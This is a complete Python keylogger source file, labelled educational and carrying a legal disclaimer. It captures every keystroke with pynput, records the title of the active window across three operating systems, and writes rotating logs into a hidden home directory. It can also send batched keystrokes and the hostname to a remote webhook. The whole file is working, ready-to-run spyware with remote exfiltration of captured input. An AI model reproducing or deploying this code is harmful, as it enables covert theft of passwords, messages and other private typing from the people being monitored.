"""
©AngelaMos | 2026
keylogger.py

Educational keylogger demonstrating keyboard capture, log management, and remote delivery

Captures keystrokes via pynput, tracks the active window across Windows, macOS,
and Linux, writes timestamped logs to disk with size-based rotation, and optionally
ships batched events to a webhook. All classes and constants live in this single file.
Directory creation happens in LogManager, not KeyloggerConfig, so config objects
carry no side effects on construction.

IMPORTANT: Unauthorized use of keyloggers is illegal. Only use on systems you own
or have explicit permission to monitor.

Key exports:
  Keylogger       - Main class, coordinates listener, log writer, and webhook
  KeyloggerConfig - Dataclass holding all runtime configuration
  KeyEvent        - Single keystroke record with timestamp, window title, and type
  LogManager      - Raw file writer with size-based rotation and explicit close()
  WebhookDelivery - Batched HTTP delivery, releases the buffer lock before POSTing
  WindowTracker   - Active window title lookup across three OS platforms
  KeyType         - Enum categorizing keystrokes as CHAR, SPECIAL, or UNKNOWN
  SPECIAL_KEYS    - Dict mapping pynput Key values to their display labels
"""

import subprocess
import platform
import logging
from enum import (
    Enum,
    auto,
)
from threading import (
    Event,
    Lock,
)
from pathlib import Path
from datetime import datetime
from dataclasses import dataclass

try:
    from pynput import keyboard
    from pynput.keyboard import Key, KeyCode
except ImportError as exc:
    raise ImportError("pynput is required: uv add pynput") from exc

try:
    import requests
except ImportError:
    requests = None  # type: ignore[assignment]

WINDOWS = "Windows"
DARWIN = "Darwin"
LINUX = "Linux"

if platform.system() == WINDOWS:
    try:
        import win32gui
        import win32process
        import psutil
    except ImportError:
        win32gui = None
elif platform.system() == DARWIN:
    try:
        from AppKit import NSWorkspace
    except ImportError:
        NSWorkspace = None

BYTES_PER_MB = 1024 * 1024
WEBHOOK_TIMEOUT_SECS = 5
WINDOW_CHECK_INTERVAL_SECS = 0.5
LISTENER_JOIN_TIMEOUT_SECS = 1.0

SPECIAL_KEYS: dict[Key,
                   str] = {
                       Key.space: "[SPACE]",
                       Key.enter: "[ENTER]",
                       Key.tab: "[TAB]",
                       Key.backspace: "[BACKSPACE]",
                       Key.delete: "[DELETE]",
                       Key.shift: "[SHIFT]",
                       Key.shift_r: "[SHIFT]",
                       Key.ctrl: "[CTRL]",
                       Key.ctrl_r: "[CTRL]",
                       Key.alt: "[ALT]",
                       Key.alt_r: "[ALT]",
                       Key.cmd: "[CMD]",
                       Key.cmd_r: "[CMD]",
                       Key.esc: "[ESC]",
                       Key.up: "[UP]",
                       Key.down: "[DOWN]",
                       Key.left: "[LEFT]",
                       Key.right: "[RIGHT]",
                   }


class KeyType(Enum):
    """
    Categorizes keystrokes as character, special, or unknown
    """
    CHAR = auto()
    SPECIAL = auto()
    UNKNOWN = auto()


@dataclass
class KeyloggerConfig:
    """
    Runtime configuration for keylogger behavior
    """
    log_dir: Path = Path.home() / ".keylogger_logs"
    log_file_prefix: str = "keylog"
    max_log_size_mb: float = 5.0
    webhook_url: str | None = None
    webhook_batch_size: int = 50
    toggle_key: Key = Key.f9
    enable_window_tracking: bool = True
    log_special_keys: bool = True
    window_check_interval: float = (WINDOW_CHECK_INTERVAL_SECS)


@dataclass
class KeyEvent:
    """
    Represents a single keyboard event
    """
    timestamp: datetime
    key: str
    window_title: str | None = None
    key_type: KeyType = KeyType.CHAR

    def to_dict(self) -> dict[str, str]:
        """
        Convert event to dictionary for serialization
        """
        return {
            "timestamp": self.timestamp.isoformat(),
            "key": self.key,
            "window_title": (self.window_title or "Unknown"),
            "key_type": self.key_type.name.lower(),
        }

    def to_log_string(self) -> str:
        """
        Format event as human readable log line
        """
        time_str = self.timestamp.strftime("%Y-%m-%d %H:%M:%S")
        window = (f" [{self.window_title}]" if self.window_title else "")
        return f"[{time_str}]{window} {self.key}"


class WindowTracker:
    """
    Active window title lookup across OS platforms
    """
    @staticmethod
    def get_active_window() -> str | None:
        """
        Get the title of the currently active window
        """
        system = platform.system()

        if system == WINDOWS and win32gui:
            return WindowTracker._get_windows_window()
        if system == DARWIN and NSWorkspace:
            return WindowTracker._get_macos_window()
        if system == LINUX:
            return WindowTracker._get_linux_window()

        return None

    @staticmethod
    def _get_windows_window() -> str | None:
        try:
            hwnd = win32gui.GetForegroundWindow()
            _, pid = (win32process.GetWindowThreadProcessId(hwnd))
            process = psutil.Process(pid)
            title = win32gui.GetWindowText(hwnd)
            if title:
                return (f"{process.name()} - {title}")
            return process.name()
        except Exception:
            return None

    @staticmethod
    def _get_macos_window() -> str | None:
        try:
            active = (NSWorkspace.sharedWorkspace().activeApplication())
            return active.get(
                'NSApplicationName',
                'Unknown',
            )
        except Exception:
            return None

    @staticmethod
    def _get_linux_window() -> str | None:
        try:
            result = subprocess.run(
                [
                    'xdotool',
                    'getactivewindow',
                    'getwindowname',
                ],
                capture_output = True,
                text = True,
                timeout = 1,
                check = False,
            )
            if result.returncode == 0:
                return result.stdout.strip()
            return None
        except Exception:
            return None


class LogManager:
    """
    File writer with automatic size-based rotation
    """
    def __init__(self, config: KeyloggerConfig):
        self.config = config
        config.log_dir.mkdir(
            parents = True,
            exist_ok = True,
        )
        self.current_log_path = (self._get_new_log_path())
        self._lock = Lock()
        self._file = open(
            self.current_log_path,
            'a',
            encoding = 'utf-8',
        )

    def _get_new_log_path(self) -> Path:
        """
        Generate a new log file path with timestamp
        """
        ts = datetime.now().strftime("%Y%m%d_%H%M%S_%f")
        name = (f"{self.config.log_file_prefix}_{ts}.txt")
        return self.config.log_dir / name

    def write_event(self, event: KeyEvent) -> None:
        """
        Write a keyboard event to the log file
        """
        with self._lock:
            self._file.write(event.to_log_string() + '\n')
            self._file.flush()
            self._check_rotation()

    def _check_rotation(self) -> None:
        """
        Rotate log file when size limit is reached
        """
        try:
            size = (self.current_log_path.stat().st_size)
        except FileNotFoundError:
            self._rotate()
            return

        if (size / BYTES_PER_MB >= self.config.max_log_size_mb):
            self._rotate()

    def _rotate(self) -> None:
        """
        Close current log file and open a new one
        """
        self._file.close()
        self.current_log_path = (self._get_new_log_path())
        self._file = open(
            self.current_log_path,
            'a',
            encoding = 'utf-8',
        )

    def get_current_log_content(self) -> str:
        """
        Read and return the current log file content
        """
        with self._lock:
            self._file.flush()
            return self.current_log_path.read_text(encoding = 'utf-8')

    def close(self) -> None:
        """
        Close the underlying file handle
        """
        with self._lock:
            self._file.close()


class WebhookDelivery:
    """
    Batched HTTP delivery of events to a remote endpoint
    """
    def __init__(self, config: KeyloggerConfig):
        self.config = config
        self.event_buffer: list[KeyEvent] = []
        self.buffer_lock = Lock()
        self.enabled = bool(config.webhook_url and requests)

    def add_event(self, event: KeyEvent) -> None:
        """
        Buffer an event and deliver when batch is full
        """
        if not self.enabled:
            return

        batch: list[KeyEvent] | None = None
        with self.buffer_lock:
            self.event_buffer.append(event)
            if (len(self.event_buffer) >= self.config.webhook_batch_size):
                batch = self.event_buffer
                self.event_buffer = []

        if batch:
            self._deliver_batch(batch)

    def _deliver_batch(
        self,
        events: list[KeyEvent],
    ) -> None:
        """
        POST buffered events to the webhook endpoint
        """
        if not events or not self.config.webhook_url:
            return

        payload = {
            "timestamp": (datetime.now().isoformat()),
            "host": platform.node(),
            "events": [e.to_dict() for e in events],
        }

        try:
            response = requests.post(
                self.config.webhook_url,
                json = payload,
                timeout = WEBHOOK_TIMEOUT_SECS,
            )
            if not response.ok:
                logging.warning(
                    "Webhook returned %s",
                    response.status_code,
                )
        except Exception:
            logging.error(
                "Webhook delivery failed",
                exc_info = True,
            )

    def flush(self) -> None:
        """
        Force delivery of remaining buffered events
        """
        batch: list[KeyEvent] | None = None
        with self.buffer_lock:
            if self.event_buffer:
                batch = self.event_buffer
                self.event_buffer = []

        if batch:
            self._deliver_batch(batch)


class Keylogger:
    """
    Coordinates listener, log writer, and webhook
    """
    def __init__(self, config: KeyloggerConfig):
        self.config = config
        self.log_manager = LogManager(config)
        self.webhook = WebhookDelivery(config)
        self.window_tracker = WindowTracker()

        self.is_running = Event()
        self.is_logging = Event()
        self.listener: keyboard.Listener | None = (None)

        self._current_window: str | None = None
        self._last_window_check = datetime.now()

    def _update_active_window(self) -> None:
        """
        Update cached window title periodically
        """
        if not self.config.enable_window_tracking:
            return

        now = datetime.now()
        elapsed = (now - self._last_window_check).total_seconds()

        if (elapsed >= self.config.window_check_interval):
            self._current_window = (self.window_tracker.get_active_window())
            self._last_window_check = now

    def _process_key(
        self,
        key: Key | KeyCode,
    ) -> tuple[str,
               KeyType]:
        """
        Convert key to string representation and type
        """
        if isinstance(key, Key):
            label = SPECIAL_KEYS.get(key)
            if label:
                return label, KeyType.SPECIAL
            return (
                f"[{key.name.upper()}]",
                KeyType.SPECIAL,
            )

        if hasattr(key, 'char') and key.char:
            return key.char, KeyType.CHAR

        return "[UNKNOWN]", KeyType.UNKNOWN

    def _on_press(
        self,
        key: Key | KeyCode,
    ) -> None:
        """
        Callback for key press events
        """
        if key == self.config.toggle_key:
            self._toggle_logging()
            return

        if not self.is_logging.is_set():
            return

        self._update_active_window()

        key_str, key_type = self._process_key(key)

        if (key_type == KeyType.SPECIAL and not self.config.log_special_keys):
            return

        event = KeyEvent(
            timestamp = datetime.now(),
            key = key_str,
            window_title = self._current_window,
            key_type = key_type,
        )

        self.log_manager.write_event(event)
        self.webhook.add_event(event)

    def _toggle_logging(self) -> None:
        """
        Toggle logging on/off with the configured key
        """
        toggle = (self.config.toggle_key.name.upper())

        if self.is_logging.is_set():
            self.is_logging.clear()
            print(f"\n[*] Logging paused. "
                  f"Press {toggle} to resume.")
        else:
            self.is_logging.set()
            print(f"\n[*] Logging resumed. "
                  f"Press {toggle} to pause.")

    def start(self) -> None:
        """
        Start the keylogger
        """
        toggle = (self.config.toggle_key.name.upper())
        webhook_status = ("Enabled" if self.webhook.enabled else "Disabled")

        print("Keylogger Started")
        print()
        print(f"Log Directory: {self.config.log_dir}")
        print("Current Log: "
              f"{self.log_manager.current_log_path.name}")
        print(f"Toggle Key: {toggle}")
        print(f"Webhook: {webhook_status}")
        print()
        print("[*] Press "
              f"{toggle} to start/stop logging")
        print("[*] Press CTRL+C to exit\n")

        self.is_running.set()
        self.is_logging.set()

        self.listener = keyboard.Listener(on_press = self._on_press)
        self.listener.start()

        try:
            while self.is_running.is_set():
                self.listener.join(timeout = (LISTENER_JOIN_TIMEOUT_SECS))
        except KeyboardInterrupt:
            self.stop()

    def stop(self) -> None:
        """
        Stop the keylogger gracefully
        """
        print("\n\n[*] Shutting down...")

        self.is_running.clear()
        self.is_logging.clear()

        if self.listener:
            self.listener.stop()

        self.webhook.flush()
        self.log_manager.close()

        print("[*] Logs saved to: "
              f"{self.config.log_dir}")
        print("[*] Keylogger stopped.")


def main() -> None:
    """
    Entry point with default configuration
    """
    keylogger = Keylogger(KeyloggerConfig())

    try:
        keylogger.start()
    except Exception as e:
        print(f"\n[!] Error: {e}")
        keylogger.stop()


if __name__ == "__main__":
    main()
"""
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡀⠀⠀⠀⠀⠀⠀⡀⠀⠀⠀⠀⠀⠀⠀⠀
⢸⠉⣹⠋⠉⢉⡟⢩⢋⠋⣽⡻⠭⢽⢉⠯⠭⠭⠭⢽⡍⢹⡍⠙⣯⠉⠉⠉⠉⠉⣿⢫⠉⠉⠉⢉⡟⠉⢿⢹⠉⢉⣉⢿⡝⡉⢩⢿⣻⢍⠉⠉⠩⢹⣟⡏⠉⠹⡉⢻⡍⡇
⢸⢠⢹⠀⠀⢸⠁⣼⠀⣼⡝⠀⠀⢸⠘⠀⠀⠀⠀⠈⢿⠀⡟⡄⠹⣣⠀⠀⠐⠀⢸⡘⡄⣤⠀⡼⠁⠀⢺⡘⠉⠀⠀⠀⠫⣪⣌⡌⢳⡻⣦⠀⠀⢃⡽⡼⡀⠀⢣⢸⠸⡇
⢸⡸⢸⠀⠀⣿⠀⣇⢠⡿⠀⠀⠀⠸⡇⠀⠀⠀⠀⠀⠘⢇⠸⠘⡀⠻⣇⠀⠀⠄⠀⡇⢣⢛⠀⡇⠀⠀⣸⠇⠀⠀⠀⠀⠀⠘⠄⢻⡀⠻⣻⣧⠀⠀⠃⢧⡇⠀⢸⢸⡇⡇
⢸⡇⢸⣠⠀⣿⢠⣿⡾⠁⠀⢀⡀⠤⢇⣀⣐⣀⠀⠤⢀⠈⠢⡡⡈⢦⡙⣷⡀⠀⠀⢿⠈⢻⣡⠁⠀⢀⠏⠀⠀⠀⢀⠀⠄⣀⣐⣀⣙⠢⡌⣻⣷⡀⢹⢸⡅⠀⢸⠸⡇⡇
⢸⡇⢸⣟⠀⢿⢸⡿⠀⣀⣶⣷⣾⡿⠿⣿⣿⣿⣿⣿⣶⣬⡀⠐⠰⣄⠙⠪⣻⣦⡀⠘⣧⠀⠙⠄⠀⠀⠀⠀⠀⣨⣴⣾⣿⠿⣿⣿⣿⣿⣿⣶⣯⣿⣼⢼⡇⠀⢸⡇⡇⠇
⢸⢧⠀⣿⡅⢸⣼⡷⣾⣿⡟⠋⣿⠓⢲⣿⣿⣿⡟⠙⣿⠛⢯⡳⡀⠈⠓⠄⡈⠚⠿⣧⣌⢧⠀⠀⠀⠀⠀⣠⣺⠟⢫⡿⠓⢺⣿⣿⣿⠏⠙⣏⠛⣿⣿⣾⡇⢀⡿⢠⠀⡇
⢸⢸⠀⢹⣷⡀⢿⡁⠀⠻⣇⠀⣇⠀⠘⣿⣿⡿⠁⠐⣉⡀⠀⠁⠀⠀⠀⠀⠀⠀⠀⠀⠉⠓⠳⠄⠀⠀⠀⠀⠋⠀⠘⡇⠀⠸⣿⣿⠟⠀⢈⣉⢠⡿⠁⣼⠁⣼⠃⣼⠀⡇
⢸⠸⣀⠈⣯⢳⡘⣇⠀⠀⠈⡂⣜⣆⡀⠀⠀⢀⣀⡴⠇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢽⣆⣀⠀⠀⠀⣀⣜⠕⡊⠀⣸⠇⣼⡟⢠⠏⠀⡇
⢸⠀⡟⠀⢸⡆⢹⡜⡆⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⠋⣾⡏⡇⡎⡇⠀⡇
⢸⠀⢃⡆⠀⢿⡄⠑⢽⣄⠀⠀⠀⢀⠂⠠⢁⠈⠄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠠⠂⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡀⠀⠄⡐⢀⠂⠀⠀⣠⣮⡟⢹⣯⣸⣱⠁⠀⡇
⠈⠉⠉⠉⠉⠉⠉⠉⠉⠉⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⠉⠉⠉⠉⠉⠉⠉⠉⠁
"""
